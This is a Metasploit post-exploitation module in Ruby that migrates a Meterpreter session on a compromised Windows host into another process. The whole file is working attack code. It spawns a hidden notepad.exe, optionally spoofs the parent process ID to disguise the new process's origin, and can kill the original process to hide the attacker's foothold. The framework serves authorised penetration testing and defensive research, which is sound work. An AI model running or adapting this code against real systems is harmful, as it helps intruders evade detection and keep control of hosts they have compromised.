##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Process

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Process Migration',
      'Description'   => %q{ This module will migrate a Meterpreter session from one process
        to another. A given process PID to migrate to or the module can spawn one and
        migrate to that newly spawned process.},
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Carlos Perez <carlos_perez[at]darkoperator.com>',
        'phra <https://iwantmore.pizza>'
      ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptBool.new(   'SPAWN',[false,'Spawn process to migrate to. If set, notepad.exe is used.', true]),
        OptInt.new(    'PID',  [false, 'PID of process to migrate to.', 0]),
        OptInt.new(    'PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing).', 0]),
        OptString.new( 'PPID_NAME', [false, 'Name of process for PPID spoofing when creating a new process.']),
        OptString.new( 'NAME', [false, 'Name of process to migrate to.']),
        OptBool.new(   'KILL', [false, 'Kill original process for the session.', false])
      ])
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    server = session.sys.process.open
    original_pid = server.pid
    print_status("Current server process: #{server.name} (#{server.pid})")

    target_pid = nil

    if datastore['SPAWN'] and datastore['SPAWN'] != ""
      target_pid = create_temp_proc
    elsif datastore['PID'] and datastore['PID'] != 0
      target_pid = datastore['PID']
    elsif datastore['NAME'] and datastore['NAME'] != ""
      target_pid = session.sys.process[datastore['NAME']]
    end

    if not target_pid or not has_pid?(target_pid)
      print_error("Process #{target_pid} not found")
      return
    end

    begin
      print_status("Migrating to #{target_pid}")
      session.core.migrate(target_pid)
      print_good("Successfully migrated to process #{target_pid}")
    rescue ::Exception => e
      print_error("Could not migrate in to process.")
      print_error("Exception: #{e.class} : #{e}")
    end

    if datastore['KILL']
      print_status("Killing original process with PID #{original_pid}")
      if has_pid?(original_pid)
        session.sys.process.kill(original_pid)
        print_good("Successfully killed process with PID #{original_pid}")
      else
        print_warning("PID #{original_pid} exited on its own")
      end
    end
  end

  # Creates a temp notepad.exe to migrate to depending the architecture.
  def create_temp_proc()
    target_ppid = session.sys.process[datastore['PPID_NAME']] || datastore['PPID']
    cmd = get_notepad_pathname(client.arch, client.sys.config.getenv('windir'), client.arch)

    print_status("Spawning notepad.exe process to migrate to")

    if target_ppid != 0 and not has_pid?(target_ppid)
      print_error("Process #{target_ppid} not found")
      return
    elsif has_pid?(target_ppid)
      print_status("Spoofing PPID #{target_ppid}")
    end

    # run hidden
    proc = session.sys.process.execute(cmd, nil, {
      'Hidden' => true,
      'ParentPid' => target_ppid
    })

    return proc.pid
  end
end
